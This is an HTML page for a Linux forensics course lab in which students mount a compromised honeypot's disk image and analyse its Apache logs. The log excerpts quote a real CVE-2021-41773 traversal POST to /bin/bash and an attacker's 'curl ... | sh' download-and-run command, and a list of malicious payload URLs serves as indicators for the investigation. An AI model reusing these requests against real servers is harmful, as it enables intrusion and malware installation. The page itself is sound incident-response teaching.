@@ -1,0 +1,240 @@
+<HTML>
+<HEAD>
+   <TITLE>Exercise 17 -- Linux Forensics</TITLE>
+   <link rel="stylesheet" type="text/css" href="../style/HalEx.css">
+</HEAD>
+<BODY>
+
+<p align="center">
+   <span class="page_title">Exercise 17: Honeypot Capstone</span><br>
+   <span class="page_subtitle">Hands-On Exercise</span>
+</p>
+
+
+<h1>Goals For This Lab<p>
+
+    This is an open-ended lab that will allow you to practice skills that you have learned
+    throughout this course. Good luck and good hunting!
+</h1>
+
+
+<h1>1. Prep UAC data</h1>
+
+<p>In a previous lab we unpacked the UAC data from Tyler Hudak's honeypot.
+  If you do not currently have a <tt>/images/uac-honeypot</tt> directory in your
+  virtual machine, follow the steps in the
+<b>Before You Get Started</b> section of
+<a href="../Ex_06/index.html">Exercise 6</a> to create this directory.</p>
+
+
+<h1>2. Mount file system image</h1>
+
+<p>Previously we were only examining the UAC data related to the honeypot. But we also have
+  a file system image, which provides more evidence. We need to get the file system
+  mounted up so we can inspect it:</p>
+
+<pre>
+[root@LAB lab]# <b>cd /images/All-Images/HudaksHoneypot/</b>
+[root@LAB HudaksHoneypot]# <b>ls</b>
+readme-hal  readme.txt  sdb.vhd.gz  uac.tgz  ubuntu.20211208.mem
+[root@LAB HudaksHoneypot]# <b>gunzip sdb.vhd.gz</b>          <i>[NOTE! Can take a while!]</i>
+[root@LAB HudaksHoneypot]# <b>ls -lh sdb.vhd</b>
+-rw-r--r--. 1 lab lab 33G Feb 24 15:32 sdb.vhd
+[root@LAB HudaksHoneypot]# <b>mmls sdb.vhd</b>
+GUID Partition Table (EFI)
+Offset Sector: 0
+Units are in 512-byte sectors
+
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Safety Table
+001:  -------   0000000000   0000002047   0000002048   Unallocated
+002:  Meta      0000000001   0000000001   0000000001   GPT Header
+003:  Meta      0000000002   0000000033   0000000032   Partition Table
+004:  013       0000002048   0000010239   0000008192
+005:  014       0000010240   0000227327   0000217088
+006:  000       0000227328   0062916574   0062689247
+007:  -------   0062916575   0067108864   0004192290   Unallocated
+[root@LAB HudaksHoneypot]# <b>fsstat -o 2048 sdb.vhd | grep Type:</b>
+Cannot determine file system type
+[root@LAB HudaksHoneypot]# <b>fsstat -o 10240 sdb.vhd | grep Type:</b>
+File System Type: FAT32
+[root@LAB HudaksHoneypot]# <b>fsstat -o 227328 sdb.vhd | grep Type:</b>
+File System Type: Ext4
+</pre>
+
+<p>OK great! It looks like we have a simple EXT4 file system to deal with.
+  No RAID, LVM, or encryption. Mounting this should be straightforward:</p>
+
+<pre>
+[root@LAB HudaksHoneypot]# <b>mkdir /mnt/honeypot</b>
+[root@LAB HudaksHoneypot]# <b>mount -o ro,noexec,noload,loop,offset=$((227328*512)) sdb.vhd /mnt/honeypot</b>
+[root@LAB HudaksHoneypot]# <b>ls /mnt/honeypot/</b>
+1    boot  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
+bin  dev   home  initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
+</pre>
+
+<p>Woot! There it is!</p>
+
+
+
+<h1>3. A most useful log file</h1>
+
+<p>We know from earlier exercises that the honeypot appears to have been compromised via the CVE-2021-41773
+  Apache directory traversal vulnerability. Clearly the web logs will be an important factor in your
+  investigation. You will find them under <tt>/mnt/honeypot/var/log/apache2</tt>.</p>
+
+<pre>
+[root@LAB HudaksHoneypot]# <b>cd /mnt/honeypot/var/log/apache2/</b>
+[root@LAB apache2]# <b>ls</b>
+access_log  error_log
+</pre>
+
+<p>However, this is not your average <tt>error_log</tt> file. Tyler enabled "<tt>mod_dumpio</tt>" in
+  Apache, which means the <tt>error_log</tt> collects all of the POST data in the web requests.
+  This is not a standard configuration, but it is amazingly useful because all of the exploits in
+  this case are using POST.</p>
+
+<p>Unfortunately, there is a lot of noise and distraction in the standard <tt>mod_dumpio</tt> output:</p>
+
+<pre>
+[root@LAB apache2]# <b>grep 5.2.72.226 error_log</b>
+[Tue Nov 30 16:19:28.915559 2021] [dumpio:trace7] [pid 2632:tid 139978537424640] mod_dumpio.c(140): [client 5.2.72.226:47374] mod_dumpio: dumpio_in [getline-blocking] 0 readbytes
+[Tue Nov 30 16:19:28.915624 2021] [dumpio:trace7] [pid 2632:tid 139978537424640] mod_dumpio.c(63): [client 5.2.72.226:47374] mod_dumpio:  dumpio_in (data-HEAP): 138 bytes
+[Tue Nov 30 16:19:28.915630 2021] [dumpio:trace7] [pid 2632:tid 139978537424640] mod_dumpio.c(103): [client 5.2.72.226:47374] mod_dumpio:  dumpio_in (data-HEAP): POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash HTTP/1.1\r\n
+[Tue Nov 30 16:19:28.915642 2021] [dumpio:trace7] [pid 2632:tid 139978537424640] mod_dumpio.c(140): [client 5.2.72.226:47374] mod_dumpio: dumpio_in [getline-blocking] 0 readbytes
+<i>[... snip ...]</i>
+</pre>
+
+<p>We found indicators in the UAC <tt>liveresponse/process/proc/15853/environ.txt</tt> files that IP
+  address 5.2.72.226 was associated with suspicious process PID 15853. Here I am pulling out the
+  <tt>mod_dumpio</tt> data associated with this IP address. You can see how difficult it is to read the output.</p>
+
+<p>So here is a crazy bit of command line kung fu to clean up the output and make it more readable:</p>
+
+<pre>
+[root@LAB apache2]# <b>grep 5.2.72.226 error_log  | grep -Ev '[0-9]* (read)?bytes' | sed 's/\[dumpio.*data-HEAP)://; s/\[pid .* AH[0-9]*://'</b>
+[Tue Nov 30 16:19:28.915630 2021]  POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash HTTP/1.1\r\n
+[Tue Nov 30 16:19:28.915652 2021]  Host: 13.82.150.103\r\n
+[Tue Nov 30 16:19:28.915666 2021]  User-Agent: curl/7.79.1\r\n
+[Tue Nov 30 16:19:28.915680 2021]  Accept: */*\r\n
+[Tue Nov 30 16:19:28.915694 2021]  Content-Length: 103\r\n
+[Tue Nov 30 16:19:28.915707 2021]  Content-Type: application/x-www-form-urlencoded\r\n
+[Tue Nov 30 16:19:28.915733 2021]  \r\n
+[Tue Nov 30 16:19:28.956301 2021]  echo Content-Type: text/plain; echo; (curl https://tmpfiles.org/dl/168017/wk.sh | sh >/dev/null 2>&1 )&
+[Tue Nov 30 16:19:29.383107 2021] [cgi:error]   : /bin/bash
+[Tue Nov 30 16:19:29.383164 2021] [cgi:error]   : /bin/bash
+<i>[... snip ...]</i>
+</pre>
+
+<p>Just change the IP address in the first part of the command line to whichever IP address you want to
+  investigate and leave the rest of the command line alone. Or maybe you can improve on my filter. Either
+  way, this should be enough to get you going.</p>
+
+
+<h1>4. Known indicators</h1>
+
+<p>As a starting point, here are some of the known indicators we found in our earlier investigations:</p>
+
+<ul>
+  <li>Suspicious URLs hosting exploit code, with <tt>wget</tt> and/or <tt>curl</tt> commands shown
+    in <tt>mod_dumpio</tt> data in many cases:<p>
+
+    <tt>http://45.137.155.55/ap.sh<br>
+    http://45.137.155.55/kinsing<br>
+    http://45.137.155.55/libsystem.so<br>
+    http://88.218.227.141/wget.sh<br>
+    http://185.191.32.198/ap.sh<br>
+    http://185.191.32.198/unk.sh<br>
+    https://tmpfiles.org/dl/168017/wk.sh<br></tt></li><p>
+
+  <li>Outbound HTTP or HTTPS connections to other external IP addresses:<p>
+
+    <tt>3.123.183.86<br>
+    3.66.81.63<br>
+    18.198.162.56<br>
+    40.79.154.83<br>
+    40.79.154.87<br>
+    91.189.91.38<br>
+    91.189.91.39<br>
+    185.104.45.29<br>
+    185.199.111.133<br></tt></li><p>
+    
+  <li>Shell process PID 20645 (and child process 6388), running as user "<tt>daemon</tt>" from deleted
+    directory <tt>/var/tmp/.log/101068/.spoollog</tt>. Associated with a POST request from IP address
+    116.202.187.77 using Curl v7.79.1.</li><p>
+
+  <li>Process hierarchy PID 15851 (bash) -&gt; PID 15853 (sh) -&gt; PID 6830 (sleep 30), running as user
+    "<tt>daemon</tt>" from directory <tt>/tmp</tt>. Also believed to be associated with XMRig coin miner
+    running as <tt>/tmp/agettyd</tt> (binary deleted). Associated with POST request from IP address
+    5.2.72.226 using Curl v7.79.1.</li><p>
+    
+  <li>Process hierarchy PID 21783 (bash) -&gt; PID 21785 (sh) -&gt; PID 6803 (sleep 30), running as user
+    "<tt>daemon</tt>" from directory <tt>/tmp</tt>. Associated with POST request from IP address
+    104.244.76.13 using Curl v7.79.1. Nearly identical to process data associated with IP address
+    5.2.72.226.</li><p>
+
+  <li><tt>/tmp/agettyd</tt> process is communicating via SSL with IP address 107.178.104.10</li><p>
+
+  <li><tt>/var/tmp/dk86</tt> and <tt>/run/lock/dk86</tt> are owned by user "<tt>daemon</tt>".</li><p>
+
+  <li>Scheduled task <tt>/root/.remove.sh</tt> runs from <tt>/var/spool/cron/crontabs/root</tt>.
+    Apparently a clean-up job created by Tyler Hudak.</li></p>
+</ul>    
+
+
+
+<h1>5. Choose your own adventure!</h1>
+
+<p>You could spend days investigating this image. There are multiple different actors all hitting
+  this machine over the course of multiple weeks.</p>
+
+<p>Here are some investigative ideas to get you going:</p>
+
+<ul>
+  <li>Investigate the <tt>/root/.remove.sh</tt> scheduled task. Does it look like a legitimate
+    admin task? What files/directories does it impact? Can you find evidence of it executing?</li><p>
+
+    <li>Fill in the details around the exploits hosted at URLs like <tt>http://45.137.155.55/ap.sh</tt>.
+      What is the source of the web requests that trigger calls to these URLs? Are
+      <tt>http://45.137.155.55/ap.sh</tt> and <tt>http://185.191.32.198/ap.sh</tt> used by the same
+      actor or different actors?</li><p>
+
+    <li>Are the exploits from IP address 5.2.72.226 and 104.244.76.13 the same actor, or different
+      actors using the same toolkit? Do you see evidence of similar exploits from other IP addresses?</li><p>
+
+    <li>Now that you have the <tt>mod_dumpio</tt> logs, fill in more detail about the exploit from
+      IP address 116.202.187.77 and the deleted <tt>/var/tmp/.log/101068/.spoollog</tt> directory.</li><p>
+
+    <li>Where did <tt>/var/tmp/dk86</tt> come from?</li><p>
+
+    <li>Do you see any other suspicious files in <tt>/tmp</tt> or <tt>/var/tmp</tt>? Where did they
+      come from?</li><p>
+
+    <li>Can you recover the deleted <tt>/tmp/agettyd</tt> binary?</li><p>
+
+    <li>We saw outgoing HTTP and/or HTTPS connections to several external IP addresses. What triggered
+      these connections? Can you discover what data may have been transferred?</li><p>
+
+    <li>How many different actors can you show evidence of? Who was the first to hit the machine?
+      Who was the most recent? Do you see any evolution of tactics over the weeks the machine was
+      available?</li><p>
+
+    <li>Can you find any evidence of any exploit managing to escalate privilege?</li><p>
+</ul>
+
+<p>There is plenty to work on! If you get hung up on one investigation, try working on something else.</p>
+
+<p>I have written a series of
+  <a href="https://righteousit.wordpress.com/2021/12/20/hudaks-honeypot-part-1/" target=_blank>blog posts</a>
+  that cover my investigation of some of the above items. These may help if you get stuck, but obviously
+  they contain lots of spoilers!</p>
+
+
+
+<h1> </h1>
+<hr>
+<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">Linux Forensics</span> by <span xmlns:cc="http://creativecommons.org/ns#" property="cc:attributionName">Hal Pomeranz</span> is licensed under a 
+<br><a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+
+</BODY>
+</HTML>
